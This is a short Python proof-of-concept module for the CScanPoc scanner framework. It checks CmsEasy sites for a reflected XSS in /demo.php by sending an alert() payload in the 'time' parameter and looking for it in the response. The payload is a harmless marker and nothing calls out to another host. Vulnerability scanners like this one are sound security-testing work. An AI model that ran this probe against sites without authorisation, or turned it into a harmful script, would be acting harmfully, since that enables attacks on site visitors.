# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType

class Vuln(ABVuln):
    poc_id = 'f807c7db-0707-4a06-994a-0795bb9422bd'
    name = 'CmsEasy /demo.php 处反射型XSS'  # 漏洞名称
    level = VulnLevel.LOW  # 漏洞危害级别
    type = VulnType.XSS # 漏洞类型
    disclosure_date = '2014-07-23'  # 漏洞公布时间
    desc = '''
        CmsEasy /demo.php 处反射型XSS 无视360webscan&浏览器filter.
    '''  # 漏洞描述
    ref = 'https://www.2cto.com/article/201409/334119.html'  # 漏洞来源
    cnvd_id = 'Unkonwn'  # cnvd漏洞编号
    cve_id = 'Unkonwn'  # cve编号
    product = 'CmsEasy'  # 漏洞应用名称
    product_version = 'Unkonwn'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = '0abe7113-94a4-4337-b33e-dc5d4847eafd'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-27'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            
            #http://www.wooyun.org/bugs/wooyun-2014-069363
            hh = hackhttp.hackhttp()
            arg = self.target
            desurl = arg + "/demo.php?time=alert(e10adc3949ba59abbe56e057f20f883e)"
            code, head, content, errcode, re_url = hh.http(desurl)

            if code == 200 and 'alert(e10adc3949ba59abbe56e057f20f883e)' in content:
                #security_info(desurl)
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()
